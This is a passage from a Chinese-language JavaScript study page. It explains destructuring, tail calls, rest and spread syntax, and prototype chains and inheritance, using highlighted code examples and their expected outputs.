console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">)</span> <span class="token comment">// 1 2 3 5</span>

<span class="token comment">// 乱序解构</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> <span class="token number">1</span><span class="token operator">:</span> a<span class="token punctuation">,</span> <span class="token number">0</span><span class="token operator">:</span> b<span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">:</span> c <span class="token punctuation">}</span> <span class="token operator">=</span> arr
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span> <span class="token comment">// 2 1 3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h5 id="函数扩展"><a href="#函数扩展" class="header-anchor">#</a> 函数扩展</h5> <h6 id="尾调用优化"><a href="#尾调用优化" class="header-anchor">#</a> 尾调用优化</h6> <p>只保留内层函数的调用帧</p> <ul><li>尾调用
<ul><li>定义：<strong>某个函数的最后一步是调用另一个函数</strong></li> <li>形式：<code>function f(x) { return g(x); }</code></li></ul></li> <li>尾递归
<ul><li>定义：<strong>函数尾调用自身</strong></li> <li>作用：<strong>只要使用尾递归就不会发生栈溢出，相对节省内存</strong></li> <li>实现：把<strong>所有用到的内部变量改写成函数的参数并使用参数默认值</strong></li></ul></li></ul> <h6 id="rest-spread参数"><a href="#rest-spread参数" class="header-anchor">#</a> rest/spread参数(...)</h6> <p><strong>rest arguments(rest剩余参数)</strong> : ES6 的 rest 语法提供了一种捷径，其中包括要传递给函数的任意数量的参数。</p> <p>就像展开语法的逆过程一样，它将数据放入并填充到数组中而不是展开数组，并且它在函数变量以及数组和对象解构分中也经常用到。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//解决了es5复杂的arguments问题</span>
<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token operator">...</span>rest</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
　　<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">+</span> y<span class="token punctuation">)</span> <span class="token operator">*</span> rest<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 9 </span>

<span class="token keyword">function</span> <span class="token function">addFiveToABunchOfNumbers</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>numbers</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> numbers<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">x</span> <span class="token operator">=&gt;</span> x <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token function">addFiveToABunchOfNumbers</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">// [9, 10, 11, 12, 13, 14, 15]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><strong>Spread Operator (展开运算符）</strong>: ES6 的展开语法在以函数形式进行编码时非常有用，可以轻松地创建数组或对象的副本，而无需求助于<code>Object.create，slice</code>或库函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//第一个用途：组装数组</span>
<span class="token keyword">let</span> color <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'red'</span><span class="token punctuation">,</span> <span class="token string">'yellow'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> colorful <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>color<span class="token punctuation">,</span> <span class="token string">'green'</span><span class="token punctuation">,</span> <span class="token string">'blue'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>colorful<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [&quot;red&quot;, &quot;yellow&quot;, &quot;green&quot;, &quot;blue&quot;]</span>
<span class="token comment">//第二个用途：：获取数组 除了某几项 的其他项</span>
<span class="token keyword">let</span> num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> <span class="token punctuation">[</span>first<span class="token punctuation">,</span> second<span class="token punctuation">,</span> <span class="token operator">...</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>rest<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [5, 7, 9]</span>

<span class="token keyword">const</span> person <span class="token operator">=</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> <span class="token string">'samy'</span><span class="token punctuation">,</span>
  age<span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> copyOfTodd <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">...</span>person <span class="token punctuation">}</span><span class="token punctuation">;</span>  
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>copyOfTodd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//{ name: 'samy', age: 10 }</span>

<span class="token keyword">const</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token operator">...</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// a: 1, b: 2, rest: [3, 4]</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> e<span class="token punctuation">,</span> f<span class="token punctuation">,</span> <span class="token operator">...</span>others <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
  e<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  f<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
  g<span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>
  h<span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment">// e: 1, f: 2, others: { g: 3, h: 4 }   </span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><h4 id="_10-原型链-继承【核心】"><a href="#_10-原型链-继承【核心】" class="header-anchor">#</a> 10:原型链/继承【核心】</h4> <h5 id="隐式-显式的区别和关系"><a href="#隐式-显式的区别和关系" class="header-anchor">#</a> 隐式/显式的区别和关系</h5> <p><code>__proto__</code>（隐式原型）与prototype（显式原型）</p> <p><strong>隐式原型</strong>：JavaScript中任意对象都有一个内置属性[[prototype]]，<strong>在ES5之前没有标准的方法访问这个内置属性，但是大多数浏览器都支持通过<code>__proto__</code>来访问。ES5中有了对于这个内置属性标准的Get方法Object.getPrototypeOf()</strong> 【 Object.prototype 这个对象是个例外，它的__proto__值为null】</p> <p><strong>显式原型</strong>：每一个函数在创建之后都会拥有一个名为prototype的属性，这个属性指向函数的原型对象。</p> <p><strong>二者的关系</strong>：隐式原型指向<strong>创建</strong>这个对象的函数(constructor)的prototype；</p> <p><strong>作用</strong></p> <ul><li><strong>隐式原型</strong>的作用：<strong>构成原型链，同样用于实现基于原型的继承</strong>。举个例子，当我们访问obj这个对象中的x属性时，如果在obj中找不到，那么就会沿着<code>__proto__</code>依次查找。</li> <li><strong>显式原型</strong>的作用：用来<strong>实现基于原型的继承与属性的共享</strong>。</li></ul> <h5 id="实例-构造函数与原型对象的关系"><a href="#实例-构造函数与原型对象的关系" class="header-anchor">#</a> 实例,构造函数与原型对象的关系</h5> <p><img src="/rat-summ/assets/img/18-40-43-1624025677546-16356095406791.4e845176.jpg" alt="18-40-43"></p> <p>升级版本图
<img src="/rat-summ/assets/img/19-12-44-16356095046851.b88ffdd0.jpg" alt=""> <img src="/rat-summ/assets/img/19-14-14-16356095046862.9baa49e9.jpg" alt=""></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment">// Fn为构造函数</span>
<span class="token keyword">var</span> f1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//f1是Fn构造函数创建出来的对象</span>
<span class="token comment">//Fn.prototype就是对象的原型 // 构造函数的prototype属性值就是对象原型。</span>
<span class="token keyword">typeof</span> <span class="token class-name">Fn</span><span class="token punctuation">.</span>prototype<span class="token operator">===</span>object<span class="token comment">// 构造函数的prototype属性值的类型就是对象;</span>
<span class="token class-name">Fn</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor<span class="token operator">===</span>Fn<span class="token comment">// 对象原型中的constructor属性指向构造函数;</span>
<span class="token comment">//f1.__proto__就是对象原型 // 对象的__proto__属性值就是对象的原型。</span>
<span class="token class-name">Fn</span><span class="token punctuation">.</span>prototype <span class="token operator">===</span> f1<span class="token punctuation">.</span>__proto__ <span class="token comment">//其实它们两个就是同一个对象---对象的原型。</span>
<span class="token class-name">Fn</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype
<span class="token keyword">typeof</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype <span class="token operator">===</span> object
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token keyword">null</span>

<span class="token comment">//特殊的一种，参考完整图； 可见之前那个简化版本，少了部分；</span>
Fn<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token comment">//[Function]</span>
Function<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype <span class="token comment">//false</span>
Function<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token comment">//true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p><strong>注意</strong>：new跟不new的区别； <strong>constructor跟constructor()的区别；</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> n1<span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n1<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//[Number: 0]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n1<span class="token punctuation">.</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//[Function: Number]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n1<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//0</span>

<span class="token keyword">var</span> n2<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Number</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//[Number: 1]</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> n1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//number</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> n2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// object;包装对象；</span>
<span class="token comment">//所有对象都有valueOf方法，valueOf方法对于：如果存在任意原始值，它就默认将对象转换为表示它的原始值。</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n2<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>其他案例：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//案例一</span>
<span class="token keyword">var</span> <span class="token function-variable function">F</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">a</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">b</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
f<span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// a</span>
<span class="token comment">// f.b(); // f.b is not a function</span>

<span class="token constant">F</span><span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// a</span>
<span class="token constant">F</span><span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// b</span>

<span class="token comment">//案例三</span>
<span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function-variable function">F</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token string">'value a'</span><span class="token punctuation">;</span>
<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token string">'value b'</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// value a</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">F</span><span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// value a</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">F</span><span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// value b</span>

<span class="token comment">//案例二：注意先后顺序</span>
<span class="token keyword">var</span> <span class="token function-variable function">A</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token class-name">A</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>n <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">A</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token punctuation">{</span>
  n<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
  m<span class="token operator">:</span> <span class="token number">3</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br></div></div><p>最后案例5图示：</p> <p><img src="/rat-summ/assets/img/image-20211105113103471.7a8f31b2.png" alt="image-20211105113103471"></p> <p>继承的引用实例：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">Parent</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token keyword">extends</span> <span class="token class-name">Parent</span><span class="token punctuation">{</span><span class="token punctuation">}</span>

<span class="token keyword">const</span> log <span class="token operator">=</span> console<span class="token punctuation">.</span>log<span class="token punctuation">;</span>

<span class="token keyword">const</span> student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> parent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">log</span><span class="token punctuation">(</span>student<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Student<span class="token punctuation">)</span><span class="token comment">//true</span>
<span class="token function">log</span><span class="token punctuation">(</span>student<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> student<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token comment">//true</span>

<span class="token function">log</span><span class="token punctuation">(</span>student<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Student</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token comment">//true</span>
<span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Student</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Parent</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token comment">//true</span>
<span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Parent</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token comment">//true</span>
<span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token comment">//true</span>

<span class="token comment">//默认3级别到底部null;但是这里本来继承一次就是4层了；</span>
<span class="token function">log</span><span class="token punctuation">(</span>student<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token comment">//true</span>

<span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Student</span><span class="token punctuation">.</span>constructor <span class="token operator">===</span> Function<span class="token punctuation">)</span><span class="token comment">//true</span>
<span class="token function">log</span><span class="token punctuation">(</span>Student<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> Parent<span class="token punctuation">)</span><span class="token comment">//true</span>

<span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Parent</span><span class="token punctuation">.</span>constructor <span class="token operator">===</span> Function<span class="token punctuation">)</span><span class="token comment">//true</span>
<span class="token function">log</span><span class="token punctuation">(</span>Parent<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> Object<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token comment">//true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><h5 id="propto-获取"><a href="#propto-获取" class="header-anchor">#</a> <code>__propto__</code>获取</h5> <blockquote><p><strong>由于 <code>__proto__</code> 的性能问题和兼容性问题，不推荐使用(之前旧版本，现在没有问题)。</strong></p></blockquote> <p><strong>推荐</strong>：</p> <ul><li>使用 <code>Object.getPrototypeOf</code> 获取原型属性;</li> <li>通过 <code>Object.setPrototypeOf</code> 修改原型属性;</li> <li>通过 <code>Object.create()</code> 继承原型;</li> <li><code>for in</code> 和 <code>Object.keys</code> 会调用原型属性;</li> <li>不调用不可枚举属性;</li> <li>isPrototypeOf 和 hasOwnProperty;</li></ul> <h5 id="对象的原型链"><a href="#对象的原型链" class="header-anchor">#</a> 对象的原型链</h5> <p>流程图示如上；</p> <p><strong>说明：</strong></p> <ol><li>所有的的对象最终都指向nul。</li> <li><strong>每个构造函数都有一个prototype属性，它是一个构造函数的原型，也是实例<code>__proto__</code>的指向</strong></li> <li>Function是一个构造函数，它拥有一个原型Function.prototype，也是new Function出实例的<code>__proto__</code>的指向</li> <li>所有的对象拥有<code>__proto__</code>属性，因为Function也是一个对象，所以<code>Function.prototype</code>和<code>示例对象.__proto__</code>指向同一个对象</li> <li><strong>所有的function都是Function的实例，因为构造函数也是一个函数</strong>，所以Bollean、String、Array、<strong>Object的<code>__proto__</code>是Function.prototype</strong></li></ol> <p>示范：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//case1</span>
<span class="token keyword">var</span> <span class="token function-variable function">A</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token class-name">A</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>n <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//new是跟定义时顺序有关</span>
<span class="token class-name">A</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token punctuation">{</span>
  n<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
  m<span class="token operator">:</span> <span class="token number">3</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//undefined</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2</span>
